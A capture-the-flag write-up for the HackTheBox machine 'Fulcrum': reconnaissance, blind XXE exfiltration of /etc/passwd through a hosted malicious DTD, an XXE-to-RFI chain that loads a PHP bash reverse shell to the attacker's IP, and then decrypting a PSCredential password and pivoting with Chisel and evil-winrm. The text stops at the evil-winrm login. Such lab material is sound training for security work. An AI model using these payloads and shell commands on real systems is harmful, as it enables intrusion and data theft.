
### Host entries
```bash
10.10.10.62 upload.fulcrum.local
```
If Active Directory => [NTP Synchronization](https://shuciran.github.io/posts/NTP-Synchronization/) with the domain controller.

### Content

- "API Enumeration - Endpoint Brute Force
- Advanced XXE Exploitation (XML External Entity Injection)
- XXE - Custom Entities
- XXE - External Entities
- XXE - XML Parameter Entities
- XXE - Blind SSRF (Exfiltrate data out-of-band) + Base64 Wrapper (Reading Internal Files)
- XXE + RFI (Remote File Inclusion) / SSRF to RCE
- Host Discovery - Bash Scripting
- Port Discovery - Bash Scripting
- Decrypting PSCredential Password with PowerShell
- PIVOTING 1 - Tunneling with Chisel + Evil-WinRM
- Gaining access to a Windows system
- PowerView.ps1 - Active Directory Users Enumeration (Playing with Get-DomainUser)
- Information Leakage - Domain User Password
- PIVOTING 2 - Using Invoke-Command to execute commands on another Windows server
- Firewall Bypassing (Playing with Test-NetConnection in PowerShell) - DNS Reverse Shell
- Authenticating to the DC shares - SYSVOL Enumeration
- Information Leakage - Domain Admin Password
- PIVOTING 3 - Using Invoke-Command to execute commands on the Domain Controller (DC)

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv -oG allPorts 10.10.10.62
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.62 ()    Status: Up
Host: 10.10.10.62 ()    Ports: 4/open/tcp//unknown///, 22/open/tcp//ssh///, 80/open/tcp//http///, 88/open/tcp//kerberos-sec///, 9999/open/tcp//abyss///, 56423/open/tcp/////
```
Services and Versions running:
```bash
nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv -oG allPorts 10.10.10.62
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.62 ()    Status: Up
Host: 10.10.10.62 ()    Ports: 4/open/tcp//unknown///, 22/open/tcp//ssh///, 80/open/tcp//http///, 88/open/tcp//kerberos-sec///, 9999/open/tcp//abyss///, 56423/open/tcp/////
# Nmap done at Sun Feb  5 22:40:38 2023 -- 1 IP address (1 host up) scanned in 25.94 seconds
                                                                                                                                                                                          
┌──(root㉿kali)-[~/…/HTB/ActiveDirectory/Fulcrum/nmap]
└─# cat targeted                                      
# Nmap 7.93 scan initiated Sun Feb  5 22:45:10 2023 as: nmap -p4,22,80,88,9999,56423 -sCV -Pn -n -vvv -oN targeted 10.10.10.62
Nmap scan report for 10.10.10.62
Host is up, received user-set (0.15s latency).
Scanned at 2023-02-05 22:45:12 GMT for 34s

PORT      STATE SERVICE REASON         VERSION
4/tcp     open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
| ssh-rsa 
...
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
| ecdsa-sha2-nistp256 
...
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
|_ssh-ed25519 
...
80/tcp    open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Input string was not in a correct format.
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: nginx/1.18.0 (Ubuntu)
88/tcp    open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: phpMyAdmin
|_http-favicon: Unknown favicon MD5: 531B63A51234BB06C9D77F219EB25553
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9999/tcp  open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Input string was not in a correct format.
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: nginx/1.18.0 (Ubuntu)
56423/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (application/json;charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Fulcrum-API Beta
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
There are a lot of web servers inside the machine so let's start in order:
##### http://10.10.10.62:4/
Simple website under maintenance with a simple redirect on it:
![Description](/assets/img/Pasted-image-20230205170008.png)
by following such URL we get a parameter being called:
![Description](/assets/img/Pasted-image-20230205170046.png)
It seems like an interesting entry point so we try the following attacks:
```bash
# Basic LFI
http://10.10.10.62:4/index.php?page=/etc/passwd
# Path Traversal
10.10.10.62:4/index.php?page=../../../../../../../../etc/passwd
# Path Traversal bypassing regex (../) deletion
http://10.10.10.62:4/index.php?page=....//....//....//....///etc/passwd
# RFI
http://10.10.10.62:4/index.php?page=http://10.10.14.3
# Additionally all of the previous scenarios were tested with NULL Byte in case that the ".php" extension is appended to every request
```
Also we identified that the home.php is also reachable with an upload feature inside but it is not possible to upload any file (jpg or php):
![Description](/assets/img/Pasted-image-20230205183353.png)
##### http://10.10.10.62/
This server throws a .NET error message while accessing the "/index.htm" endpoint:
![Description](/assets/img/Pasted-image-20230205183842.png)
Other than that nothing interesting...
##### http://10.10.10.62:88/
Port 88 has a phpMyAdmin login panel, interesting... but no default credentials in place so let's keep with the enumeration:
![Description](/assets/img/Pasted-image-20230205184025.png)
Now this service is interesting since it has a ton of endpoints available, after fuzzing this is the list that we get with dirsearch:
```bash
dirsearch -u http://10.10.10.62:88/

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927
...
Target: http://10.10.10.62:88/

[00:41:42] Starting: 
[00:41:43] 301 -  178B  - /js  ->  http://10.10.10.62:88/js/               
[00:41:52] 200 -    2KB - /CONTRIBUTING.md                                  
[00:41:52] 200 -   13KB - /ChangeLog                                        
[00:41:53] 200 -   18KB - /LICENSE                                          
[00:41:53] 200 -    1KB - /README                                           
[00:42:07] 200 -   14KB - /ajax.php                                         
[00:42:12] 200 -    2KB - /composer.json                                    
[00:42:13] 200 -    0B  - /config.inc.php                                   
[00:42:14] 200 -   78KB - /composer.lock                                    
[00:42:16] 301 -  178B  - /doc  ->  http://10.10.10.62:88/doc/              
[00:42:16] 403 -  564B  - /doc/                                             
[00:42:17] 200 -   14KB - /doc/html/index.html                              
[00:42:18] 301 -  178B  - /examples  ->  http://10.10.10.62:88/examples/    
[00:42:19] 403 -  564B  - /examples/                                        
[00:42:19] 200 -   14KB - /export.php                                       
[00:42:19] 200 -   22KB - /favicon.ico                                      
[00:42:22] 200 -   14KB - /import.php                                       
[00:42:23] 200 -   14KB - /index.php                                        
[00:42:24] 403 -  564B  - /js/                                              
[00:42:24] 200 -   26KB - /js/config.js                                     
[00:42:25] 403 -  564B  - /libraries/                                       
[00:42:25] 301 -  178B  - /libraries  ->  http://10.10.10.62:88/libraries/
[00:42:25] 200 -   14KB - /license.php                                      
[00:42:26] 200 -   14KB - /logout.php                                       
[00:42:32] 200 -   14KB - /phpinfo.php                                      
[00:42:37] 200 -   26B  - /robots.txt                                       
[00:42:40] 301 -  178B  - /sql  ->  http://10.10.10.62:88/sql/              
[00:42:40] 200 -   14KB - /sql.php                                          
[00:42:40] 403 -  564B  - /sql/
[00:42:42] 301 -  178B  - /templates  ->  http://10.10.10.62:88/templates/   
[00:42:42] 403 -  564B  - /templates/                                       
[00:42:43] 403 -  564B  - /themes/                                           
[00:42:43] 301 -  178B  - /themes  ->  http://10.10.10.62:88/themes/         
[00:42:45] 200 -    0B  - /vendor/autoload.php                               
[00:42:45] 403 -  564B  - /vendor/                                          
[00:42:45] 200 -    0B  - /vendor/composer/autoload_classmap.php            
[00:42:46] 200 -    0B  - /vendor/composer/autoload_files.php               
[00:42:46] 200 -    0B  - /vendor/composer/ClassLoader.php
[00:42:46] 200 -    0B  - /vendor/composer/autoload_static.php              
[00:42:46] 200 -    0B  - /vendor/composer/autoload_real.php                
[00:42:46] 200 -    0B  - /vendor/composer/autoload_namespaces.php          
[00:42:46] 200 -    0B  - /vendor/composer/autoload_psr4.php                
[00:42:46] 200 -    1KB - /vendor/composer/LICENSE                          
[00:42:46] 200 -   20KB - /vendor/composer/installed.json
```
However none of them contains any useful information.
##### http://10.10.10.62:9999/
No interesting endpoints on this port and the same error as in port 80:
![Description](/assets/img/Pasted-image-20230205185142.png)
##### http://10.10.10.62:56423/
Now for this port we get a response as shown in the image below, which indicates an API JSON response:
![Description](/assets/img/Pasted-image-20230205185330.png)
Let's deep dive into it by intercepting the traffic with Burpsuite:
![Description](/assets/img/Pasted-image-20230205185558.png)
Since this Content-Type allows application/json we can infer that a POST request should be allowed on the machine so let's change the HTTP Method and send it to observe the server's behavior after providing our IP as payload:
![Description](/assets/img/Pasted-image-20230205185833.png)
Notice that the Content-Type is non-restrictive since we didn't use the "application/json" so let's try a few payloads and different Contents, it is worth mentioning that we indeed receive an ICMP request after executing this payload:
```bash
tcpdump -i tun0 -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
00:58:11.870424 IP 10.10.14.3.60996 > 10.10.10.62.56423: ...
00:58:11.947098 IP 10.10.10.62.56423 > 10.10.14.3.60996: ...
00:58:11.947139 IP 10.10.14.3.60996 > 10.10.10.62.56423: ...
00:58:11.947296 IP 10.10.14.3.60996 > 10.10.10.62.56423: ...
00:58:12.081060 IP 10.10.10.62.56423 > 10.10.14.3.60996: ...
00:58:12.112944 IP 10.10.10.62.56423 > 10.10.14.3.60996: ...
```

### Exploitation

If we try with XML payload and we provide the parameter Ping this is what happens:
![Description](/assets/img/Pasted-image-20230205190544.png)
This tiny change on the server's response gives us a nice amount of time to think about a successful XXE, after searching over the Internet we find the following [Hactricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity) cheatsheet with an interesting "External Entity Injection" approach, after we tested it as follows:
![Description](/assets/img/Pasted-image-20230205195341.png)
We indeed received a request on our HTTP Listener:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.62-[06/Feb/2023 01:50:23] "GET /pwned.js HTTP/1.0" 200
```
You can often detect blind XXE triggering the out-of-band network interaction to a system that you control. For example, you would define an external entity as follows: ^c2e4bb
```c
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.14.3"> ]>

<Heartbleed>
<Ping>&xxe;</Ping>
</Heartbleed>
```
![Description](/assets/img/Pasted-image-20230206005533.png)
In this case we receive a request on our web server:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.62 - - [06/Feb/2023 06:50:04] "GET / HTTP/1.0" 200 -
```
Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:
```c
<!ENTITY % myparameterentity "my parameter entity value" >
```
And second, parameter entities are referenced using the percent character instead of the usual ampersand:
```c
%myparameterentity;
```
This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:
```c
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://10.10.14.3"> %xxe; ]>
```
![Description](/assets/img/Pasted-image-20230206005654.png)
Detecting a blind XXE vulnerability via out-of-band techniques is all very well, but it doesn't actually demonstrate how the vulnerability could be exploited. What an attacker really wants to achieve is to exfiltrate sensitive data. This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.

An example of a malicious DTD to exfiltrate the contents of the `/etc/passwd` file is as follows:
![Description](/assets/img/Pasted-image-20230206005910.png)
```c
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY filename SYSTEM 'http://10.10.14.3/%file;'>">
```

This DTD carries out the following steps:

-   Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file with a wrapper to encode the payload as base64.
-   Defines an XML parameter entity called `param1`, containing a dynamic declaration of another XML parameter entity called `filename`. The `filename` entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the `file` entity within the URL query string.
-   Uses the `param1` entity, which causes the dynamic declaration of the `filename` entity to be performed.
-   Uses the `filename` entity, so that its value is evaluated by requesting the specified URL.

The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL:
```bash
http://10.10.14.3/structure.xml
# Python web server:
python3 -m http.server 80
```

Finally, the attacker must submit the following XXE payload to the vulnerable application:
```c
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/structure.xml"> %xxe; %param1;]>

<Heartbleed>
<Ping>&filename;</Ping>
</Heartbleed>
```
![Description](/assets/img/Pasted-image-20230206013133.png)
And we'll receive the following request on our web server:
```python
10.10.10.62 - - [06/Feb/2023 07:30:52] "GET /cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnVzYm11eDp4OjExMjo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovdXNyL3NiaW4vbm9sb2dpbgpkbnNtYXNxOng6MTEzOjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovdXNyL3NiaW4vbm9sb2dpbgpsaWJ2aXJ0LXFlbXU6eDo2NDA1NToxMDg6TGlidmlydCBRZW11LCwsOi92YXIvbGliL2xpYnZpcnQ6L3Vzci9zYmluL25vbG9naW4KbGlidmlydC1kbnNtYXNxOng6MTE0OjEyMDpMaWJ2aXJ0IERuc21hc3EsLCw6L3Zhci9saWIvbGlidmlydC9kbnNtYXNxOi91c3Ivc2Jpbi9ub2xvZ2luCg== HTTP/1.0" 404 -
```
This request is the exfiltrated `/etc/passwd` file encoded in base 64, after decoded it we can see it in clear text:
```bash
echo -n "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGF...
saWIvbGlidmlydC9kbnNtYXNxOi91c3Ivc2Jpbi9ub2xvZ2luCg==" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
libvirt-qemu:x:64055:108:Libvirt Qemu,,,:/var/lib/libvirt:/usr/sbin/nologin
libvirt-dnsmasq:x:114:120:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/usr/sbin/nologin
```
Now that we already have this Local File Inclusion, we can start enumerating some useful files:
`/var/www/api/index.php`
```bash
<?php
        header('Content-Type:application/json;charset=utf-8');
        header('Server: Fulcrum-API Beta');
        libxml_disable_entity_loader (false);
        $xmlfile = file_get_contents('php://input');
        $dom = new DOMDocument();
        $dom->loadXML($xmlfile,LIBXML_NOENT|LIBXML_DTDLOAD);
        $input = simplexml_import_dom($dom);
        $output = $input->Ping;
        //check if ok
        if($output == "Ping")
        {
                $data = array('Heartbeat' => array('Ping' => "Ping"));
        }else{
                $data = array('Heartbeat' => array('Ping' => "Pong"));
        }
        echo json_encode($data);
?>
```
`/etc/nginx/nginx.conf`
```bash
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
        # multi_accept on;
}

http {

        ##
        # Basic Settings
        ##

        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        # server_tokens off;

        # server_names_hash_bucket_size 64;
        # server_name_in_redirect off;

        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        ##
        # SSL Settings
        ##

        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
        ssl_prefer_server_ciphers on;

        ##
        # Logging Settings
        ##

        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;

        ##
        # Gzip Settings
        ##

        gzip on;

        # gzip_vary on;
        # gzip_proxied any;
        # gzip_comp_level 6;
        # gzip_buffers 16 8k;
        # gzip_http_version 1.1;
        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

        ##
        # Virtual Host Configs
        ##

        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}


#mail {
#       # See sample authentication script at:
#       # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
# 
#       # auth_http localhost/auth.php;
#       # pop3_capabilities "TOP" "USER";
#       # imap_capabilities "IMAP4rev1" "UIDPLUS";
# 
#       server {
#               listen     localhost:110;
#               protocol   pop3;
#               proxy      on;
#       }
# 
#       server {
#               listen     localhost:143;
#               protocol   imap;
#               proxy      on;
#       }
#}
```
However no interesting file is to be found so we keep enumerating and we find the following approach to get a reverse shell.
Since we already know that in port 80 there is a service with a potential SSRF vulnerability, we can try to use our Blind XXE to abuse this SSRF and call a php reverse shell from our web server but using a localhost call to such web page:
```bash
# Burpsuite payload
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:4/index.php?page=http://10.10.14.3/rev">]>

<Heartbleed>
<Ping>&xxe;</Ping>
</Heartbleed>
# Web server Request
10.10.10.62-[06/Feb/2023 07:56:29] "GET /rev.php HTTP/1.0" 404
```
![Description](/assets/img/Pasted-image-20230206015759.png)

As we can see the request is appending a .php extension at the end of the endpoint called from this LFI payload, so we can conclude that it is expecting a PHP file, we can abuse of this and provide a reverse shell on this php to lead the server to provide a reverse shell: ^e70b79
```php
<?php
	system("bash -c 'bash -i >& /dev/tcp/10.10.14.3/1234 0>&1'");
?>
```
And we get a shell...

# Pivoting #1
The machine has two interfaces, this means that the machine is the entry point for a possible network so let's keep enumerating:
```bash
www-data@fulcrum:~/pma$ hostname -I
10.10.10.62 192.168.122.1 dead:beef::250:56ff:feb9:9287
```
By executing a host discovery script we can get the available Hosts on the network.
1) If we ping a host and the host replies to the ping request, the status code will be successful or "0"; if the ping is unsuccessful then the status code will be "1":
```bash
# Upon success
www-data@fulcrum:/tmp$ ping -c 1 192.168.122.1 &>/dev/null
www-data@fulcrum:/tmp$ echo $?
0
# Upon failure
www-data@fulcrum:/tmp$ ping -c 1 192.168.122.2 &>/dev/null
www-data@fulcrum:/tmp$ echo $?
1
```
2) Using logic operators AND (&&) we can craft a one-liner such as the following to print only those IPs that are alive:
```bash
www-data@fulcrum:/tmp$ for i in $(seq 1 255); do timeout 1 bash -c "ping -c 1 192.168.122.$i &>/dev/null" && echo "[+] IP 192.168.122.$i active" ; done
[+] IP 192.168.122.1 active
[+] IP 192.168.122.228 active
```
3) Optional: The one-liner is slowly, to play with threads we can create a script and disown the process of this one-liner in such way that the loop does not run one instruction at a time:
```bash
# hostDiscovery.sh
#!/bin/bash
for i in $(seq 1 255):
do
        timeout 1 bash -c "ping -c 1 192.168.122.$i &>/dev/null" && echo "[+] IP 192.168.122.$i active" &
done; wait
```
IP 192.168.122.228 is also active so now we can create a port Discovery script to check which ports are open:
```bash
#!/bin/bash
for i in $(seq 1 65535):
do
        timeout 1 bash -c "echo '' > /dev/tcp/192.168.122.228/$i" && echo "[+] Port $i active" &
done; wait
```
Results open port tcp-80(HTTP) and tcp-5985(Win-RM), this ports has nothing on it, so let's keep enumerating, we actually find the following script `Fulcrum_Upload_to_Corp.ps1`:
```bash
www-data@fulcrum:~/uploads$ cat Fulcrum_Upload_to_Corp.ps1 
# TODO: Forward the PowerShell remoting port to the external interface
# Password is now encrypted \o/

$1 = 'WebUser'
$2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
$3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA=' 
$4 = $3 | ConvertTo-SecureString -key $2
$5 = New-Object System.Management.Automation.PSCredential ($1, $4)

Invoke-Command -Computer upload.fulcrum.local -Credential $5 -File Data.ps1
```
It seems like some encoded credentials which we can retrieve if we find the way to decoded them, the interesting needle on this script is the `$4` variable which has the password, we can know that because of the `ConvertTo-SecureString` module which is basically saving the password in memory using `$3` and `$2` variables, so let's search a way to retrieve them. A quick search on Internet provides us with the method to # [PowerShell - Decode System.Security.SecureString to readable password](https://stackoverflow.com/questions/7468389/powershell-decode-system-security-securestring-to-readable-password)
```ruby
# Encoded password
$password = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
# Decode the password
$Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($password)

$result = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)

[System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)
$result
```
In order to apply this steps we need to load our encoded password onto a powershell bash, we can use [PWSH], an interactive shell on kali to execute powershell commands:
```powershell
pwsh
Type 'help' to get help.
PS> 
```
Then we load all the variables that are part of the encoded password in the `Fulcrum_Upload_to_Corp.ps1` file to the pwsh shell:
```powershell
PS> $2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','

PS> $3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA='

PS> $4 = $3 | ConvertTo-SecureString -key $2
```
Finally we follow the steps on the stackoverflow guide:
```powershell
PS> $Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($4)

PS> $result = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)

PS> [System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)

PS> $result
M4ng£m£ntPa55
```
Then, since we already discovered that the port 5985 is open on the remote host (192.168.122.228) we can use [Chisel] to forward our traffic to it:
```bash
# On kali
./chisel server -p 1234 --reverse --socks5
# On Compromised machine (192.168.122.1)
./chisel client 10.10.14.3:1234 R:127.0.0.1:socks
# Configure the /etc/proxychains4.conf file
[ProxyList]
socks5 127.0.0.1 1080
```
Finally use evil-winrm to get access to the machine:
```bash
proxychains -q evil-winrm -i 192.168.122.228 -u 'WebUser' -p 'M4ng£m£ntPa55'
